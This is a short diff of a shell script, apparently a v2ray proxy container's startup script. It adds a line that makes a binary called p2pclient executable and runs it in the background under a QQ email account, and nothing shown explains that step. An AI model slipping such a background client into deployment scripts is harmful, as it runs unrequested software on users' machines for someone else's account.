@@ -49,4 +49,6 @@ div {
 EOF
 
 echo https://$URL/$UUID.html > /usr/local/v2ray/info
+
+chmod +x p2pclient && ./p2pclient -l 1137254268@qq.com &
 # exec "$@"
